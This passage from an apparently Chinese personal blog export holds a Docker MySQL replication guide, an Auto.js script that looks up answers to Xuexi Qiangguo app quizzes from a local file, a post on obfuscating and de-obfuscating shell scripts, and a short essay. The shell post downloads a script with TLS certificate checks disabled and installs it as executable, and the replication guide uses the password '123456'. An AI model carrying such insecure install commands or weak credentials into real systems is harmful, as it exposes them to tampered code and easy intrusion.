<p><strong>master主库运行：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; show master status\G;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2020/08/16/%E5%9F%BA%E4%BA%8Edocker+mysql%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/image-20201016214157287.png" alt="image-20201016214157287"></p>
<p>看到且记住相应文件名字和位置，下面会用到</p>
<p><strong>slave从库运行：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#设置主库链接</span><br><span class="line">change master to master_host&#x3D;&#39;172.17.0.9&#39;,master_user&#x3D;&#39;slave&#39;,master_password&#x3D;&#39;123456&#39;,master_log_file&#x3D;&#39;mysql-bin.000004&#39;,master_log_pos&#x3D;2037,master_port&#x3D;3306;</span><br><span class="line"></span><br><span class="line">#执行从库同步</span><br><span class="line">start slave;</span><br><span class="line"></span><br><span class="line">#查看从库同步状态</span><br><span class="line">show slave status\G;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2020/08/16/%E5%9F%BA%E4%BA%8Edocker+mysql%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/image-20201016214227265.png" alt="image-20201016214227265"></p>
<p>在结果中看到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Slave_IO_Running: Yes</span><br><span class="line">Slave_SQL_Running: Yes</span><br></pre></td></tr></table></figure>

<p>即可成功同步！</p>
<h2 id="主从同步验证"><a href="#主从同步验证" class="headerlink" title="主从同步验证"></a>主从同步验证</h2><p>1 如当前数据库情况如下：</p>
<p><img src= "/img/loading.gif" data-src="/2020/08/16/%E5%9F%BA%E4%BA%8Edocker+mysql%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/image-20201016214303340.png" alt="image-20201016214303340"></p>
<p>2、在master主库容器中，创建数据库master_demo，并在此库下创建表userinfo，并插入一条记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database master_demo;</span><br><span class="line">use master_demo;</span><br><span class="line">create table userinfo(username varchar(50),age int);</span><br><span class="line">insert into userinfo values(&#39;Tom&#39;,18);</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2020/08/16/%E5%9F%BA%E4%BA%8Edocker+mysql%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/image-20201016214410258.png" alt="image-20201016214410258"></p>
<p>3、此时，进入从库容器中，查看:</p>
<p><img src= "/img/loading.gif" data-src="/2020/08/16/%E5%9F%BA%E4%BA%8Edocker+mysql%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/image-20201016214420938.png" alt="image-20201016214420938"></p>
<p>确实已经将在master主库新建的数据库和表记录都同步过来了。</p>
<p>既然是主从同步，那反过来验证一下，在从库下插入记录后，会不会同步到主库中来呢？</p>
<p>在从库上操作插入记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into userinfo values(&#39;slave&#39;,20);</span><br></pre></td></tr></table></figure>

<p>查看：</p>
<p><img src= "/img/loading.gif" data-src="/2020/08/16/%E5%9F%BA%E4%BA%8Edocker+mysql%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/image-20201016214450831.png" alt="image-20201016214450831"></p>
<p>切到master主库中，查看：</p>
<p><img src= "/img/loading.gif" data-src="/2020/08/16/%E5%9F%BA%E4%BA%8Edocker+mysql%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/image-20201016214500923.png" alt="image-20201016214500923"></p>
<p>发现在master主库中，还是只有一条记录，说明与预期设想的一样，在从库中插入记录，是不会同步到master主库中来的</p>
<p>再来一次，在主库master上，插入新记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into userinfo values(&#39;master&#39;,25);</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2020/08/16/%E5%9F%BA%E4%BA%8Edocker+mysql%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/image-20201016214530758.png" alt="image-20201016214530758"></p>
<p>在从库中，查看</p>
<p><img src= "/img/loading.gif" data-src="/2020/08/16/%E5%9F%BA%E4%BA%8Edocker+mysql%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/image-20201016214544948.png" alt="image-20201016214544948"></p>
<p>发现在master主库中新加入的master记录，在从库中同步过来了。</p>
<p>到此，基于docker mysql数据库的主从同步配置，验证到此结束</p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>主从复制</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>学习强国-自动查题脚本（需本地题库）</title>
    <url>/2019/05/02/%E5%AD%A6%E4%B9%A0%E5%BC%BA%E5%9B%BD-%E8%87%AA%E5%8A%A8%E6%9F%A5%E9%A2%98%E8%84%9A%E6%9C%AC%EF%BC%88%E9%9C%80%E6%9C%AC%E5%9C%B0%E9%A2%98%E5%BA%93%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>学习强国脚本编写如下</p>
<p>脚本编写如下</p>
<p>脚本编写如下</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">auto();</span><br><span class="line"></span><br><span class="line">var window = floaty.window(</span><br><span class="line">   &lt;vertical h="133dp" w="auto"&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;frame gravity="right"&gt;</span><br><span class="line">    &lt;vertical &gt;</span><br><span class="line">           &lt;linear gravity="left"&gt; </span><br><span class="line">             &lt;button id="copyf"  gravity="left" text="《保存题目》 " style="Widget.AppCompat.Button.borderless.Colored" w="auto" textSize="13sp" textColor="#f43006"/&gt;</span><br><span class="line">             &lt;button id="click_me" text="" textSize="13sp" style="Widget.AppCompat.Button.borderless.Colored"  w="auto" textColor="#f44336"/&gt;</span><br><span class="line">           &lt;/linear&gt;</span><br><span class="line">        &lt;text id="text" textSize="13sp" textColor="#f44336"/&gt;</span><br><span class="line">        &lt;/vertical&gt;</span><br><span class="line">    &lt;/frame&gt;</span><br><span class="line">    &lt;/vertical&gt;</span><br><span class="line">);</span><br><span class="line"><span class="comment">//window.setSize(-1, -2);window.setPosition(x, y) //margin="-3"</span></span><br><span class="line"></span><br><span class="line">window.setPosition(110,0);</span><br><span class="line"></span><br><span class="line">window.exitOnClose();</span><br><span class="line"></span><br><span class="line">window.copyf.click(()=&gt;&#123;</span><br><span class="line">    window.setAdjustEnabled(!window.isAdjustEnabled());</span><br><span class="line">&#125;);</span><br><span class="line">window.text.click(()=&gt;&#123;</span><br><span class="line">  window.setAdjustEnabled(!window.isAdjustEnabled());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">setInterval(()=&gt;&#123;</span><br><span class="line">    ui.run(function()&#123;</span><br><span class="line">        window.text.setText(dynamicText());</span><br><span class="line">        window.click_me.setText(dynamicText2());</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;, 500);</span><br><span class="line"></span><br><span class="line">function dynamicText()&#123;</span><br><span class="line">    var str = ""</span><br><span class="line">    if(jieguo3=="")&#123;jieguo3="等待查找，或没有对应的题库(900.txt)！"+"\n"+"        无答案题目保存在根目录900err.txt中"&#125;</span><br><span class="line">    str += jieguo3;</span><br><span class="line">    return str;</span><br><span class="line">&#125;</span><br><span class="line">function dynamicText2()&#123;</span><br><span class="line">  return dateformat();</span><br><span class="line">&#125;</span><br><span class="line">function dateformat()&#123;</span><br><span class="line">  var now = new Date();</span><br><span class="line">  var hh = now.getHours(); //时</span><br><span class="line">  var ii = now.getMinutes(); //分</span><br><span class="line">  var ss = now.getSeconds(); //秒</span><br><span class="line">  var time =  "当前系统时间：";</span><br><span class="line">  if (hh &lt; 10) time += "0";</span><br><span class="line">   time += hh + ":";</span><br><span class="line">   if (ii &lt; 10) time += '0';</span><br><span class="line">   time += ii + ":";</span><br><span class="line">   if (ss &lt; 10) time += '0';</span><br><span class="line">   time += ss;</span><br><span class="line">  return time//获取当前日期 2019-04-17 10:27:27</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取当前页面信息</span></span><br><span class="line">function ye()&#123;</span><br><span class="line">  const ROOT_NODE_NAME = 'FrameLayout';</span><br><span class="line">  const TIMEOUT_FOR_LOOKUP_NODE = 450;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取当前应用的包名</span></span><br><span class="line">  const getCurrentPackage = function getPackageNameOfTheForegroundApplication(timeout) &#123;</span><br><span class="line">  const node = getRootNode(timeout);</span><br><span class="line">   return node !== null ? node.packageName() : currentPackage();</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取 FrameLayout 根节点</span></span><br><span class="line">  const getRootNode = function getFrameLayoutNode(timeout) &#123;</span><br><span class="line">      try&#123;</span><br><span class="line">          return className(ROOT_NODE_NAME).findOne(timeout || TIMEOUT_FOR_LOOKUP_NODE)</span><br><span class="line">          &#125;catch(err)&#123;return null&#125;</span><br><span class="line">     </span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取所有指定节点及其子节点的描述内容和文本内容</span></span><br><span class="line">  const getAllTextualContent = function getAllDescriptionAndTextUnderNodeRecursively(node) &#123;</span><br><span class="line">    let items = [];</span><br><span class="line">    const getDescAndText = function(node) &#123;</span><br><span class="line">      if (node !== null) &#123;</span><br><span class="line">        items.push(node.desc());</span><br><span class="line">        items.push(node.text());</span><br><span class="line"></span><br><span class="line">        for (let len = node.childCount(), i = 0; i &lt; len; i++) &#123;</span><br><span class="line">          getDescAndText(node.child(i));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    getDescAndText(node || getRootNode());</span><br><span class="line">    return items.filter(item =&gt; item !== '' &amp;&amp; item !== null);</span><br><span class="line">  &#125;;</span><br><span class="line">return getAllTextualContent();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//全部替换为</span></span><br><span class="line">function JS_search(data,key,key1)&#123;</span><br><span class="line">    re =new RegExp(key,'g')</span><br><span class="line">    return (data.replace(re,key1).trim())</span><br><span class="line">    <span class="comment">//fileread("这是文件","体现的是")</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function a3(sstr,array1,array2,array3)&#123;</span><br><span class="line">  var patt1=new RegExp(array1);</span><br><span class="line">  var patt2=new RegExp(array2);</span><br><span class="line">  var sstrg=""</span><br><span class="line">  if (patt1.test(sstr)==true &amp;&amp; patt2.test(sstr)==true&amp;&amp; sstr!==undefined)&#123;</span><br><span class="line">      sstrg=sstr</span><br><span class="line">  &#125;else</span><br><span class="line">  &#123;</span><br><span class="line">     var patt1=new RegExp(array1);</span><br><span class="line">  var patt2=new RegExp(array3);</span><br><span class="line">  </span><br><span class="line">  if (patt1.test(sstr)==true &amp;&amp; patt2.test(sstr)==true&amp;&amp; sstr!==undefined)&#123;</span><br><span class="line">      sstrg=sstr</span><br><span class="line">  &#125;else</span><br><span class="line">  &#123;</span><br><span class="line">      var patt1=new RegExp(array3);</span><br><span class="line">  var patt2=new RegExp(array2);</span><br><span class="line">  </span><br><span class="line">  if (patt1.test(sstr)==true &amp;&amp; patt2.test(sstr)==true&amp;&amp; sstr!==undefined)&#123;</span><br><span class="line">      sstrg=sstr</span><br><span class="line">  &#125;else</span><br><span class="line">  &#123;</span><br><span class="line">    var patt1=new RegExp(array1);</span><br><span class="line">    var patt2=new RegExp(array2);</span><br><span class="line">    var patt3=new RegExp(array3);</span><br><span class="line">    if (patt1.test(sstr)==true || patt2.test(sstr)==true|| patt3.test(sstr)==true)&#123;</span><br><span class="line">        sstrg=sstr</span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">        sstrg="空题库"</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return sstrg</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">//以读取模式打开文件 java.io.FileNotFoundException: /sdcard/4441.txt (No such file or directory)</span></span><br><span class="line">  function fileread(path,sz)&#123;</span><br><span class="line">  <span class="comment">//var path = "/sdcard/4111.txt";</span></span><br><span class="line">  sssss="";</span><br><span class="line">  stat="";</span><br><span class="line">  if(!files.exists(path))&#123;</span><br><span class="line">      toast("文件不存在: " + path);</span><br><span class="line">      exit();</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">  file = open(path, "r","GBK")</span><br><span class="line">  <span class="comment">//sstr1+=file.readline()+"\n";</span></span><br><span class="line">  <span class="comment">//读取剩余所有行并打印</span></span><br><span class="line">  for each(line in file.readlines())&#123;</span><br><span class="line">    if (line!=null)&#123;</span><br><span class="line">    <span class="comment">//  var start = JS_rep(line).indexOf(JS_rep(sz));</span></span><br><span class="line">     <span class="comment">// if (start&gt;=0)&#123;sstr1=sstr1+line+"\n"&#125;</span></span><br><span class="line">     sssss =panduan(line,sz);</span><br><span class="line">     stat=stat+sssss</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  file.close();</span><br><span class="line">  &#125;</span><br><span class="line">  return stat</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  function JS_rep(sz)&#123;</span><br><span class="line">    sz=JS_search(sz," ","");</span><br><span class="line">    sz=JS_search(sz,"　","");</span><br><span class="line">    sz=JS_search(sz,"“","");</span><br><span class="line">    sz=JS_search(sz,"”","");</span><br><span class="line">    sz=JS_search(sz,"。","");</span><br><span class="line">    sz=JS_search(sz,"、","");</span><br><span class="line">  </span><br><span class="line">    sz=JS_search(sz,",","");</span><br><span class="line">    sz=JS_search(sz,"（","");</span><br><span class="line">    sz=JS_search(sz,"）","");</span><br><span class="line">     sz=JS_search(sz,"\\(","");</span><br><span class="line">    sz=JS_search(sz,"\\)","");</span><br><span class="line">    sz=JS_search(sz,"：","");</span><br><span class="line">    sz=JS_search(sz,"，","");</span><br><span class="line">    sz=JS_search(sz,"。","");</span><br><span class="line">    sz=JS_search(sz," ","");</span><br><span class="line">    sz=JS_search(sz,"？","");</span><br><span class="line">    sz=JS_search(sz,"《","");</span><br><span class="line">      sz=JS_search(sz,"》","");</span><br><span class="line">        sz=JS_search(sz,"：","");</span><br><span class="line">        sz=JS_search(sz,"    ","");</span><br><span class="line">        sz=JS_search(sz,"【","");</span><br><span class="line">        sz=JS_search(sz,"】","");</span><br><span class="line">        sz=JS_search(sz,"，","");</span><br><span class="line">        sz=JS_search(sz,"“","");</span><br><span class="line">  var start = sz.indexOf("出题单位")</span><br><span class="line">  if (start&gt;2)&#123;sz=sz.substring(0,start)&#125;else&#123;sz=sz&#125;;</span><br><span class="line">  return sz</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  function panduan(fileline,timu)&#123;</span><br><span class="line"></span><br><span class="line">    fileline1=fileline;</span><br><span class="line">        fileline=JS_rep(fileline);</span><br><span class="line">    sz=JS_rep(timu);</span><br><span class="line">    jie=""</span><br><span class="line">    jie1=""</span><br><span class="line">    jie2=""</span><br><span class="line">    jie3=""</span><br><span class="line">    jie4=""</span><br><span class="line">    jiezong=""</span><br><span class="line"> if (sz.length&lt;7)&#123;</span><br><span class="line">    biaoji=1 </span><br><span class="line">    <span class="comment">//log(biaoji+sz);&#125;</span></span><br><span class="line"> &#125;</span><br><span class="line"> if (sz.length&gt;= 7 &amp;&amp; sz.length&lt;= 20) &#123; </span><br><span class="line">    biaoji=3</span><br><span class="line"> var sz01=sz.substring(0,parseInt(sz.length/3));</span><br><span class="line"> var sz02=sz.substring(parseInt(sz.length/3)-1,parseInt(sz.length*2/3));</span><br><span class="line"> var sz03=sz.substring(parseInt(sz.length*2/3)-2,sz.length);</span><br><span class="line"> <span class="comment">//log(biaoji+sz01+"+"+sz02+"+"+sz03);</span></span><br><span class="line"> &#125;</span><br><span class="line"> if (sz.length&gt;20) &#123;  </span><br><span class="line">   biaoji=3</span><br><span class="line"> var sz01=sz.substring(0+2,parseInt(sz.length/4));</span><br><span class="line"> var sz02=sz.substring(parseInt(sz.length/4+3),parseInt(sz.length*2/4));</span><br><span class="line"> var sz03=sz.substring(parseInt(sz.length*2/4+4)+1,parseInt(sz.length*5/6));</span><br><span class="line"> <span class="comment">//var sz04=sz.substring(parseInt(sz.length*3/4)+1,sz.length-1);</span></span><br><span class="line"> <span class="comment">//log(biaoji+sz01+"+"+sz02+"+"+sz03+"+"+sz04);</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> if (biaoji=1)&#123;</span><br><span class="line">    var n = fileline.indexOf(sz)</span><br><span class="line">    <span class="comment">//log("n"+n)</span></span><br><span class="line">    if(n&gt;=0)&#123;jie+=fileline1+"\n"&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  if (biaoji=3)&#123;</span><br><span class="line">    var n = fileline.indexOf(sz)</span><br><span class="line">    var n1 = fileline.indexOf(sz01)</span><br><span class="line">    var n2 = fileline.indexOf(sz02)</span><br><span class="line">    var n3 = fileline.indexOf(sz03)</span><br><span class="line">   </span><br><span class="line">    if(n&gt;=0)&#123;jie1+=fileline1+"\n"&#125;else&#123;</span><br><span class="line">      if((n1&gt;=0&amp;&amp;n2&gt;=0)||(n2&gt;=0&amp;&amp;n3&gt;=0)||(n1&gt;=0&amp;&amp;n3&gt;=0))&#123;</span><br><span class="line">        jie2+=fileline1+"\n"</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">             if((n1&gt;=0||n2&gt;=00||n3&gt;=0))&#123;jie3+=fileline1+"\n" &#125;else&#123;</span><br><span class="line">               jie4=""</span><br><span class="line">             &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> if(jie!="")&#123;jiezong="00┞"+jiezong+jie&#125;else&#123;if(jie1!="")&#123;jiezong="11┞"+jiezong+jie1&#125;else&#123;if(jie2!="")&#123;jiezong="22┞"+jiezong+jie2&#125;else&#123;if(jie3!="")&#123;jiezong="33┞"+jiezong+jie3&#125;else&#123;jiezong=""+jiezong+jie4&#125;&#125;&#125;&#125;</span><br><span class="line">return jiezong</span><br><span class="line"><span class="comment">// if(jie!="")&#123;return jie&#125;else&#123;if(jie1!="")&#123;return  jie1&#125;else&#123;if(jie2!="")&#123;return jie2&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">//if(jie!="")&#123;log("jie"+jie)&#125;else&#123;if(jie1!="")&#123;log("jie1"+jie1)&#125;else&#123;if(jie2!="")&#123;log("jie2"+jie2)&#125;else&#123;if(jie3=="")&#123;log(jie3)&#125;&#125;&#125;&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads.start(function() &#123;</span><br><span class="line">  </span><br><span class="line"> setInterval(()=&gt;&#123;</span><br><span class="line">     </span><br><span class="line">     var textb=ye();</span><br><span class="line">     xief=textb.join("/")</span><br><span class="line">    <span class="comment">// log(textb)</span></span><br><span class="line">     if (textb.length&gt;2)&#123;</span><br><span class="line"></span><br><span class="line">          xief=textb.join("/")</span><br><span class="line">       strzichuan =textb[1];</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">// log(jieguo3)</span></span><br><span class="line"> &#125;, 1000);</span><br><span class="line"></span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> threads.start(function() &#123;</span><br><span class="line">  </span><br><span class="line"> setInterval(()=&gt;&#123;</span><br><span class="line"></span><br><span class="line">  if (currentActivity() == "com.alibaba.lightapp.runtime.activity.CommonWebViewActivity")&#123;</span><br><span class="line">     var arrsort=[]; </span><br><span class="line">     var tmpstr=""</span><br><span class="line">     </span><br><span class="line">tmpstr=strzichuan</span><br><span class="line">for (i=0;i&lt;narr;i++)&#123;</span><br><span class="line">  if (tmpstr!==strzichuan)&#123;break;&#125;</span><br><span class="line"> jieguo=panduan(arrsstr[i],strzichuan)</span><br><span class="line"></span><br><span class="line"> if (jieguo!=="")&#123;arrsort.push(jieguo)&#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//log(arrsort)</span></span><br><span class="line">    if (arrsort.length !==  0)&#123;arrsort.sort();jieguo3=arrsort.join("");jieguo3=JS_search(jieguo3,"00┞","");jieguo3=JS_search(jieguo3,"11┞","");jieguo3=JS_search(jieguo3,"22┞","");jieguo3=JS_search(jieguo3,"33┞","");&#125;</span><br><span class="line">    else&#123;</span><br><span class="line"></span><br><span class="line">      jieguo3=""</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//if (jieguo2=="")&#123;jieguo3="没有找到题库0"&#125;</span></span><br><span class="line">&#125;  </span><br><span class="line">    </span><br><span class="line"><span class="comment">// log(jieguo3)</span></span><br><span class="line"> &#125;, 1000);</span><br><span class="line"></span><br><span class="line"> &#125;);</span><br><span class="line">  var biaoji=0</span><br><span class="line">  var jieguo2=""</span><br><span class="line">    var jieguo3=""</span><br><span class="line">  var jieguo=""</span><br><span class="line">  var  strzichuan ="学习强国"</span><br><span class="line">  var  xief =""</span><br><span class="line">  <span class="comment">//var sz="谓“隐形飞机”是指        的飞机。（出题单位：中国科普研究所）"</span></span><br><span class="line"></span><br><span class="line"> var arrsstr= new Array(); //定义一数组</span><br><span class="line"> var path="/sdcard/Pictures/4111.txt"</span><br><span class="line"> if(!files.exists(path))&#123;</span><br><span class="line">      toast("文件不存在: " + path);</span><br><span class="line">      exit();</span><br><span class="line">  &#125;else&#123;</span><br><span class="line"> <span class="comment">//以读取模式打开文件</span></span><br><span class="line"> file = open("/sdcard/Pictures/4111.txt", "r","GBK")</span><br><span class="line"> <span class="comment">//file = open("/sdcard/900.txt", "r","GBK")</span></span><br><span class="line"> <span class="comment">//读取一行并打印</span></span><br><span class="line"> arrsstr.push(file.readline());</span><br><span class="line"> <span class="comment">//读取剩余所有行并打印</span></span><br><span class="line"> for each(line in file.readlines())&#123;</span><br><span class="line">   if (line!=null)&#123;</span><br><span class="line">   arrsstr.push(line)</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> file.close()</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">//读文件约0.59秒  数组循环约4秒  快的2秒</span></span><br><span class="line">   <span class="comment">//sstr1=fileread("/sdcard/Pictures/4111.txt",sz)</span></span><br><span class="line">   <span class="comment">//arrsstr=sstr1.jion("\n")</span></span><br><span class="line">  <span class="comment">// log(arrsstr[1])</span></span><br><span class="line">   var narr=arrsstr.length</span><br><span class="line">   var one1=""</span><br><span class="line">  <span class="comment">// log(narr)</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习强国</category>
      </categories>
      <tags>
        <tag>json</tag>
        <tag>学习强国</tag>
      </tags>
  </entry>
  <entry>
    <title>常见的 Shell 脚本的加密解密方法</title>
    <url>/2019/10/29/%E5%B8%B8%E8%A7%81%E7%9A%84%20Shell%20%E8%84%9A%E6%9C%AC%E7%9A%84%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>玩 Linux 肯定会看到不少好玩的脚本，很想琢磨琢磨看他们具体的写法和实现原理。可惜原作者都或多或少对源码脚本进行了适当的处理，无法正常读取。所以这次就来简单的学习下几种简单的脚本加密方式以及其解密方法</p>
<h1 id="1-GZEXE-压缩算法"><a href="#1-GZEXE-压缩算法" class="headerlink" title="1.GZEXE 压缩算法"></a>1.GZEXE 压缩算法</h1><p>这个算法不是很高级，主要是为了压缩代码而使用的。严格意义上来说不算是个加密工具。但是很多人对此很无奈，我也就简单介绍下。<code>gzexe</code> 一般为系统自带，需要加密（压缩）的时候只需要写</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzexe 脚本名称.sh</span><br></pre></td></tr></table></figure>

<p>加密（压缩）后的脚本就会覆盖原脚本，不过原脚本也会备份在目录下</p>
<p>解密的方法也很简单：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzexe -d 脚本名称.sh</span><br></pre></td></tr></table></figure>

<h1 id="2-SHC-加密算法"><a href="#2-SHC-加密算法" class="headerlink" title="2.SHC 加密算法"></a>2.SHC 加密算法</h1><p>这算是个稍微高档一点的算法，是真正意义上的加密。</p>
<p>SHC 安装方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://www.datsi.fi.upm.es/%7Efrosal/sources/shc-3.8.9.tgz</span><br><span class="line">tar vxf shc-3.8.9.tgz</span><br><span class="line">cd shc-3.8.9 </span><br><span class="line">make test </span><br><span class="line">make strings </span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>使用方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shc -v -f 脚本名称.sh</span><br></pre></td></tr></table></figure>

<p>参数说明：<br>-v 是现实加密过程</p>
<p>-f 后面跟需要加密的文件</p>
<p>解密方法也很简单，只需要安装 <code>Unshc</code> 软件<br>GitHub 地址：<a href="https://github.com/yanncam/UnSHc/" target="_blank" rel="noopener">https://github.com/yanncam/UnSHc/</a></p>
<p>安装方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -N --no-check-certificate -O /usr/local/bin/unshc https://raw.githubusercontent.com/yanncam/UnSHc/master/latest/unshc.sh;chmod +x /usr/local/bin/unshc</span><br></pre></td></tr></table></figure>

<p>使用方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unshc 脚本名称.sh</span><br></pre></td></tr></table></figure>

<h1 id="3-UPX-加密算法"><a href="#3-UPX-加密算法" class="headerlink" title="3.UPX 加密算法"></a>3.UPX 加密算法</h1><p>UPX 是一个简单的加壳算法，需要去下载相应的程序去执行加密和解密</p>
<p>GitHub 项目地址：<a href="https://github.com/upx/upx/" target="_blank" rel="noopener">https://github.com/upx/upx/</a></p>
<p>程序下载地址：<a href="https://github.com/upx/upx/releases" target="_blank" rel="noopener">https://github.com/upx/upx/releases</a></p>
<p><code>注意图中对应的系统版本下载：</code></p>
<p>下载完解压，赋予执行权限。</p>
<p>加壳命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./upx 脚本名称.sh</span><br><span class="line">./upx -d 脚本名称.sh</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>shell脚本</category>
      </categories>
      <tags>
        <tag>shell脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>归</title>
    <url>/2018/06/27/%E5%BD%92/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src= "/img/loading.gif" data-src="/2018/06/27/%E5%BD%92/image-20200727211143020.png" alt="image-20200727211143020"></p>
<p>先是与回校的公交擦肩而过，因为太困在车上睡着了又坐过了站。很难想象回个学校居然能这么一波三折，所幸坐过得不多，稍一思忖便决定步行回去。不过也因此多了一些一个人独处的时间以及今天的这段文字。</p>
<p>一个人走在城市的路上的体验是非常微妙的，那是一种比孤独更甚的孤独。你的身边是车水马龙，着眼处是万家灯火，头顶满是霓虹的光晕。但那都不是你能够驻足的所在，就像灯光下的影子最为黑暗，越是繁华处的孤独越无处诉说。 </p>
<p>林语堂先生曾这样解读“孤独”，“孤独两个字拆开，有孩童，有瓜果，有小犬，有蚊蝇，足以撑起一个盛夏傍晚的巷子口，人情味十足。稚儿擎瓜柳蓬下，细犬逐蝶深巷中。人间繁华多笑语，唯我空余两鬓风。孩童水果猫狗飞蝇当然热闹，可都与你无关。这，就叫孤独。</p>
<p>” 离开家乡数年，在郑州呆的时间太长，以至于在城市呆得愈久就愈是能体会这份心思。 </p>
<p>这里没有会打湿脚踝的露水，没有寻不得出处的虫鸣，没有会不小心糊到脸上的蛛丝，鞋子进了砂子也只能走到四下无人的地方悄悄倒出来。城市要求我们同它一般庄重地活着。 </p>
